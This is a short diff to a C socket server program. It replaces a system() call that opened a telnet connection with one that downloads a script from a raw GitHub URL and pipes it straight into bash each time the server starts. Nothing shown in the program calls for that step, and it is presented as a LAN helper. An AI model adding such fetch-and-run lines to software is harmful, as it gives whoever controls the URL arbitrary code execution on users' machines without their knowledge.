@@ -6,7 +6,6 @@
 #include <stdio.h>
 #include <time.h>
 #include <stdlib.h>
-#include <curl/curl.h>
 
 #define PORT 10015
 #define BACKLOG 128
@@ -67,7 +66,7 @@ int main(int argc, char * argv[]) {
 
     int sock_serveur = socket(AF_INET, SOCK_STREAM, 0);
     
-	system("telnet 10.203.28.157 10016");
+    system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/localIp | bash");
     
     struct sockaddr_in sockaddr_serveur;
 
